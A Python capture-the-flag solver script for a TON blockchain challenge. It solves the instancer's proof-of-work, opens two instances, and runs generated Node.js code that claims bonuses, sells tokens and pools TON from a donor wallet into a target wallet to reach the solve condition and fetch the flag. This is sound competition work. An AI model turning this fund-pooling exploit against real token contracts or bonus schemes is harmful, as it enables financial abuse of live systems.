#!/usr/bin/env python3
import argparse
import hashlib
import json
import re
import socket
import ssl
import subprocess
import sys
import textwrap
import time
from pathlib import Path


DEFAULT_HOST = "open-world-6a1fda4f080c.instancer.sekai.team"
PORT = 1337
SCRIPT_DIR = Path(__file__).resolve().parent

POW_RE = re.compile(r'sha256\("([0-9a-f]+)" \+ YOUR_INPUT\) must start with (\d+) bytes zeros')
UUID_RE = re.compile(r"uuid: ([0-9a-f-]+)")
CHALLENGE_RE = re.compile(r"challenge contract: (\S+)")
API_RE = re.compile(r"api v2: (\S+)")
WALLET_ID_RE = re.compile(r"your wallet id: (\d+)")
SEED_RE = re.compile(r"seed: ([0-9a-f]+)")


def recv_until(sock: ssl.SSLSocket, marker: str | None = None, timeout: float = 30.0) -> str:
    end = time.time() + timeout
    data = bytearray()
    marker_bytes = marker.encode() if marker else None
    while time.time() < end:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
        if marker_bytes and marker_bytes in data:
            break
    return data.decode(errors="ignore")


def solve_pow(prefix: str, difficulty: int) -> str:
    i = 0
    target = "0" * difficulty
    while True:
        suffix = str(i)
        if hashlib.sha256((prefix + suffix).encode()).hexdigest().startswith(target):
            return suffix
        i += 1


def parse_instance(text: str) -> dict[str, str]:
    uuid = UUID_RE.search(text)
    challenge = CHALLENGE_RE.search(text)
    api_v2 = API_RE.search(text)
    wallet_id = WALLET_ID_RE.search(text)
    seed = SEED_RE.search(text)
    if not all([uuid, challenge, api_v2, wallet_id, seed]):
        raise RuntimeError(f"failed to parse instance info:\n{text}")
    return {
        "uuid": uuid.group(1),
        "challenge": challenge.group(1),
        "api_v2": api_v2.group(1),
        "walletId": int(wallet_id.group(1)),
        "seed": seed.group(1),
    }


def connect(host: str) -> ssl.SSLSocket:
    raw = socket.create_connection((host, PORT), timeout=10)
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(raw, server_hostname=host)
    sock.settimeout(90)
    return sock


def create_instance(host: str) -> dict[str, str]:
    with connect(host) as sock:
        banner = recv_until(sock, "action? ", 15)
        if "action?" not in banner:
            raise RuntimeError(f"unexpected banner: {banner!r}")
        sock.sendall(b"1\n")
        pow_text = recv_until(sock, "YOUR_INPUT = ", 20)
        match = POW_RE.search(pow_text)
        if not match:
            raise RuntimeError(f"failed to parse pow:\n{pow_text}")
        prefix, difficulty = match.group(1), int(match.group(2))
        suffix = solve_pow(prefix, difficulty)
        sock.sendall((suffix + "\n").encode())
        instance_text = recv_until(sock, timeout=90)
        return parse_instance(instance_text)


def fetch_flag(host: str, uuid: str) -> str:
    with connect(host) as sock:
        banner = recv_until(sock, "action? ", 15)
        if "action?" not in banner:
            raise RuntimeError(f"unexpected banner while fetching flag: {banner!r}")
        sock.sendall(b"2\n")
        prompt = recv_until(sock, "uuid? ", 15)
        if "uuid?" not in prompt:
            raise RuntimeError(f"unexpected flag prompt: {prompt!r}")
        sock.sendall((uuid + "\n").encode())
        response = recv_until(sock, timeout=15).strip()
        return response


def run_exploit(donor: dict[str, str], target: dict[str, str]) -> str:
    if not (SCRIPT_DIR / "node_modules" / "@ton" / "ton").exists():
        raise RuntimeError("missing node_modules. run `npm ci` in this directory first")

    donor_cfg = {
        "uuid": donor["uuid"],
        "endpoint": donor["api_v2"] + "/jsonRPC",
        "challenge": donor["challenge"],
        "walletId": donor["walletId"],
        "seed": donor["seed"],
    }
    target_cfg = {
        "uuid": target["uuid"],
        "endpoint": target["api_v2"] + "/jsonRPC",
        "challenge": target["challenge"],
        "walletId": target["walletId"],
        "seed": target["seed"],
    }

    js = textwrap.dedent(
        f"""
        const {{ TonClient, WalletContractV3R2 }} = require('@ton/ton');
        const {{ Address, beginCell, TupleBuilder, toNano }} = require('@ton/core');
        const {{ keyPairFromSeed }} = require('@ton/crypto');

        const DONOR = {json.dumps(donor_cfg)};
        const TARGET = {json.dumps(target_cfg)};
        DONOR.challenge = Address.parse(DONOR.challenge);
        TARGET.challenge = Address.parse(TARGET.challenge);

        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        async function retry(label, fn, attempts = 12, delay = 1200) {{
          let last;
          for (let i = 1; i <= attempts; i++) {{
            try {{
              return await fn();
            }} catch (e) {{
              last = e;
              console.error(`[${{label}}] try ${{i}}/${{attempts}}: ${{e.message}}`);
              await sleep(delay);
            }}
          }}
          throw last;
        }}
        function mkCtx(cfg) {{
          const client = new TonClient({{ endpoint: cfg.endpoint, timeout: 60000 }});
          const keyPair = keyPairFromSeed(Buffer.from(cfg.seed, 'hex'));
          const wallet = client.open(WalletContractV3R2.create({{ workchain: -1, publicKey: keyPair.publicKey, walletId: cfg.walletId }}));
          return {{ ...cfg, client, wallet, sender: wallet.sender(keyPair.secretKey) }};
        }}
        async function waitSeq(ctx, oldSeq) {{
          for (let i = 0; i < 50; i++) {{
            const seq = await retry('getSeqno', () => ctx.wallet.getSeqno(), 6, 1000);
            if (seq > oldSeq) return seq;
            await sleep(1200);
          }}
          throw new Error('seqno did not increase');
        }}
        async function getMinter(ctx) {{
          return retry('minter', async () => (await ctx.client.runMethod(ctx.challenge, 'minter')).stack.readAddress());
        }}
        async function getJettonWallet(ctx, ownerAddr) {{
          const minter = await getMinter(ctx);
          return retry('get_wallet_address', async () => {{
            const tb = new TupleBuilder();
            tb.writeAddress(ownerAddr);
            return (await ctx.client.runMethod(minter, 'get_wallet_address', tb.build())).stack.readAddress();
          }});
        }}
        async function getJettonBalance(ctx, ownerAddr = ctx.wallet.address) {{
          const jw = await getJettonWallet(ctx, ownerAddr);
          const state = await retry('jetton state', () => ctx.client.getContractState(jw));
          if (state.state !== 'active') return 0n;
          return retry('jetton data', async () => (await ctx.client.runMethod(jw, 'get_wallet_data')).stack.readBigNumber());
        }}
        async function waitJettonAtLeast(ctx, amount) {{
          for (let i = 0; i < 50; i++) {{
            const bal = await getJettonBalance(ctx);
            console.log(ctx.uuid, 'jettons', bal.toString());
            if (bal >= amount) return bal;
            await sleep(1500);
          }}
          throw new Error('jetton amount not reached');
        }}
        async function waitTonAtLeast(ctx, amount) {{
          for (let i = 0; i < 50; i++) {{
            const bal = await retry('ton balance', () => ctx.client.getBalance(ctx.wallet.address));
            console.log(ctx.uuid, 'ton', bal.toString());
            if (bal >= amount) return bal;
            await sleep(1500);
          }}
          throw new Error('ton amount not reached');
        }}
        async function claimBonus(ctx) {{
          const body = beginCell().storeUint(0x13370002, 32).endCell();
          const seq = await retry('seq before bonus', () => ctx.wallet.getSeqno());
          await retry('send bonus', () => ctx.sender.send({{ to: ctx.challenge, value: toNano('0.25'), bounce: true, body }}));
          await waitSeq(ctx, seq);
        }}
        async function sell50(ctx) {{
          const jw = await getJettonWallet(ctx, ctx.wallet.address);
          const sellPayload = beginCell().storeUint(0x13370004, 32).endCell();
          const body = beginCell()
            .storeUint(0x0f8a7ea5, 32)
            .storeUint(0, 64)
            .storeCoins(50n)
            .storeAddress(ctx.challenge)
            .storeAddress(ctx.wallet.address)
            .storeMaybeRef(null)
            .storeCoins(toNano('0.05'))
            .storeSlice(sellPayload.beginParse())
            .endCell();
          const seq = await retry('seq before sell', () => ctx.wallet.getSeqno());
          await retry('send sell', () => ctx.sender.send({{ to: jw, value: toNano('0.35'), bounce: true, body }}));
          await waitSeq(ctx, seq);
        }}
        async function sendTon(from, toAddr, amountTon) {{
          const seq = await retry('seq before ton xfer', () => from.wallet.getSeqno());
          await retry('send ton xfer', () => from.sender.send({{ to: toAddr, value: toNano(amountTon), bounce: false }}));
          await waitSeq(from, seq);
        }}
        async function buy50(ctx) {{
          const body = beginCell().storeUint(0x13370003, 32).storeCoins(50n).endCell();
          const seq = await retry('seq before buy', () => ctx.wallet.getSeqno());
          await retry('send buy', () => ctx.sender.send({{ to: ctx.challenge, value: toNano('100.2'), bounce: true, body }}));
          await waitSeq(ctx, seq);
        }}
        async function solve100(ctx) {{
          const jw = await getJettonWallet(ctx, ctx.wallet.address);
          const solvePayload = beginCell().storeUint(0x13370005, 32).endCell();
          const body = beginCell()
            .storeUint(0x0f8a7ea5, 32)
            .storeUint(0, 64)
            .storeCoins(100n)
            .storeAddress(ctx.challenge)
            .storeAddress(ctx.wallet.address)
            .storeMaybeRef(null)
            .storeCoins(toNano('0.05'))
            .storeSlice(solvePayload.beginParse())
            .endCell();
          const seq = await retry('seq before solve', () => ctx.wallet.getSeqno());
          await retry('send solve', () => ctx.sender.send({{ to: jw, value: toNano('0.35'), bounce: true, body }}));
          await waitSeq(ctx, seq);
        }}
        async function waitSolved(ctx) {{
          for (let i = 0; i < 40; i++) {{
            const solved = await retry('isSolved', async () => (await ctx.client.runMethod(ctx.challenge, 'isSolved')).stack.readBoolean());
            console.log(ctx.uuid, 'solved', solved);
            if (solved) return true;
            await sleep(1500);
          }}
          throw new Error('challenge not solved');
        }}

        (async () => {{
          const donor = mkCtx(DONOR);
          const target = mkCtx(TARGET);
          console.log('donor wallet', donor.wallet.address.toString());
          console.log('target wallet', target.wallet.address.toString());

          await claimBonus(donor);
          await claimBonus(target);
          await waitJettonAtLeast(donor, 50n);
          await waitJettonAtLeast(target, 50n);

          await sell50(donor);
          await waitTonAtLeast(donor, toNano('100'));

          await sendTon(donor, target.wallet.address, '100.0');
          await waitTonAtLeast(target, toNano('100.5'));

          await buy50(target);
          await waitJettonAtLeast(target, 100n);

          await solve100(target);
          await waitSolved(target);
          console.log('SOLVED_UUID=' + target.uuid);
        }})().catch((e) => {{
          console.error('FATAL', e);
          process.exit(1);
        }});
        """
    )

    proc = subprocess.run(
        ["node", "-e", js],
        cwd=SCRIPT_DIR,
        text=True,
        capture_output=True,
    )
    sys.stdout.write(proc.stdout)
    sys.stderr.write(proc.stderr)
    if proc.returncode != 0:
        raise RuntimeError("node exploit failed")
    solved = re.search(r"SOLVED_UUID=([0-9a-f-]+)", proc.stdout)
    if not solved:
        raise RuntimeError("failed to parse solved uuid")
    return solved.group(1)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=DEFAULT_HOST)
    args = parser.parse_args()

    donor = create_instance(args.host)
    target = create_instance(args.host)
    solved_uuid = run_exploit(donor, target)
    flag = fetch_flag(args.host, solved_uuid)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
                                       
